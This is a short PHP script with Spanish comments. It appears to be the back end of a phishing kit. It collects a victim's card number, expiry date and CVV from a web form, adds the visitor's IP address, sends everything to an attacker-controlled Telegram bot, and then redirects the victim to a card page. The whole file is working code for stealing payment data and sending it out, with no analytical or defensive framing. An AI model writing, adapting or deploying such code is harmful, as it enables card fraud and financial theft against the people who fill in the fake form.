<?php
// Incluir el archivo de configuración
include 'config.php';

// Verificar que las variables estén definidas
if (!isset($token) || !isset($chat_id)) {
    die("Error: El token o el ID de chat no están definidos.");
}

// Obtener los datos del formulario
$tarjeta = $_POST['tarj'];
$fecha = $_POST['fecha'];
$cvv = $_POST['pass'];

// Función para obtener la IP del cliente
function obtenerIPCliente() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Obtener la IP del cliente
$ip_cliente = obtenerIPCliente();

// Formatear el mensaje con todos los datos
$mensaje = "📝 *Detalles de la Tarjeta Recibida* 📝\n\n";
$mensaje .= "💳 *Número de Tarjeta*: $tarjeta\n";
$mensaje .= "📅 *Fecha de Expiración*: $fecha\n";
$mensaje .= "🔒 *Código de Seguridad (CVV)*: $cvv\n";
$mensaje .= "🌍 *IP del Cliente*: $ip_cliente\n";

// Enviar los datos a Telegram
$telegram_url = "https://api.telegram.org/bot$token/sendMessage";
$data = [
    'chat_id' => $chat_id,
    'text' => $mensaje,
    'parse_mode' => 'Markdown'
];

// Usar cURL para enviar la solicitud a Telegram
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegram_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Verificar si el mensaje fue enviado con éxito
if ($response === false) {
    die("Error al enviar el mensaje a Telegram.");
} else {
    // Redirigir a card.html después de enviar los datos
    header("Location: /card.html");
    exit;
}
?>
